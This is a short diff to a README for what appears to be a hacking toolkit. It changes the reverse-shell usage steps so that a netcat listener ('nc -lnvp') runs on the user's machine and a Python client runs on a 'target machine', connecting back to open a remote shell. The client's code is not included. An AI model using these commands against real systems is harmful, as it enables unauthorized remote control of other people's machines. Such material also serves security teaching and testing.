@@ -36,14 +36,14 @@ python port_scanner.py <target_ip>
 ```
 
 ### Reverse Shell
-**Run the server (listener):**
+**Bind the reverse shell server on your machine:**
 ```bash
-python reverse_shell_server.py
+nc -lnvp <listener_port>
 ```
 
-**Run the client (connect to server):**
+**Run the reverse sheel on your target machine:**
 ```bash
-python reverse_shell_client.py <listener_ip> <listener_port>
+python reverse_shell_client.py <your_machine_ip> <listener_port>
 ```
 
 ---
